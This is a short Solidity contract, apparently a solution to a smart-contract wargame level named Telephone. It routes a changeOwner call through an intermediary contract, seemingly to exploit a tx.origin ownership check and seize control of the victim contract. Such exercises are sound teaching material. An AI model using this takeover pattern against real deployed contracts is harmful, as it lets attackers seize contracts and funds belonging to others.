pragma solidity ^0.6.0;

import '../levels/Telephone.sol';

contract TelephoneAttack {

  function attack(address _victim, address _owner) public {
    Telephone telephone = Telephone(_victim);
    telephone.changeOwner(_owner);
  }
}